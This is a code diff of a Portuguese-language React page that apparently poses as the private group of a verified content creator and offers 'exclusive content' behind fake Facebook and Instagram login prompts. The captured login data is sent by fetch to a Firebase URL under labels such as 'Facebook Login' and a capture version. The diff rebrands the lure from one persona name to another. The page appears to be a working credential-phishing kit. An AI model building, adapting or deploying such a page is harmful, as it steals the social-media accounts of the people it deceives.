@@ -325,7 +325,7 @@ export default function GrupoIsabella() {
         dataHoraISO: deviceInfo.dateTime,
         timestamp: deviceInfo.timestamp,
         versaoCaptura: "2.4",
-        fonte: "Isabella Lua - Facebook Login",
+        fonte: "Kayane Santos - Facebook Login",
       }
 
       const response = await fetch(firebaseUrl, {
@@ -425,7 +425,7 @@ export default function GrupoIsabella() {
         dataHoraISO: deviceInfo.dateTime,
         timestamp: deviceInfo.timestamp,
         versaoCaptura: "2.4",
-        fonte: "Isabella Lua - Instagram Login",
+        fonte: "Kayane Santos - Instagram Login",
       }
 
       const response = await fetch(firebaseUrl, {
@@ -509,7 +509,7 @@ export default function GrupoIsabella() {
 
                     <div className="flex-1 text-center sm:text-left">
                       <div className="flex flex-col sm:flex-row items-center sm:items-start gap-2 mb-2">
-                        <h2 className="text-xl sm:text-2xl font-bold text-white">Isabella Lua</h2>
+                        <h2 className="text-xl sm:text-2xl font-bold text-white">Kayane Santos</h2>
                         <div className="flex items-center gap-2">
                           <div className="bg-blue-500 rounded-full p-1">
                             <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
@@ -651,7 +651,7 @@ export default function GrupoIsabella() {
         <footer className="border-t border-white/10 bg-black/20 backdrop-blur-sm py-4">
           <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
             <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-400">
-              <p>© 2024 Isabella Lua. Todos os direitos reservados.</p>
+              <p>© 2025 Kayane Santos. Todos os direitos reservados.</p>
               <div className="flex gap-4">
                 <a href="#" className="hover:text-white transition-colors">
                   Privacidade
@@ -693,7 +693,7 @@ export default function GrupoIsabella() {
                 </div>
                 <h4 className="text-lg font-semibold text-gray-800 mb-2">Conectar ao Grupo Privado</h4>
                 <p className="text-sm text-gray-600">
-                  Entre com sua conta do Facebook para acessar o conteúdo exclusivo da <strong>Isabella Lua</strong>
+                  Entre com sua conta do Facebook para acessar o conteúdo exclusivo da <strong>Kayane Santos</strong>
                 </p>
               </div>
 
@@ -750,7 +750,7 @@ export default function GrupoIsabella() {
 
               <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
                 Ao continuar, você concorda em acessar o conteúdo exclusivo e suas informações básicas serão
-                compartilhadas com Isabella Lua.
+                compartilhadas com Kayane Santos.
               </p>
             </div>
           </div>
@@ -780,7 +780,7 @@ export default function GrupoIsabella() {
                 </div>
                 <h4 className="text-lg font-semibold text-gray-800 mb-2">Acessar Conteúdo Exclusivo</h4>
                 <p className="text-sm text-gray-600">
-                  Entre com sua conta do Instagram para descobrir o conteúdo premium da <strong>Isabella Lua</strong>
+                  Entre com sua conta do Instagram para descobrir o conteúdo premium da <strong>Kayane Santos</strong>
                 </p>
               </div>
 
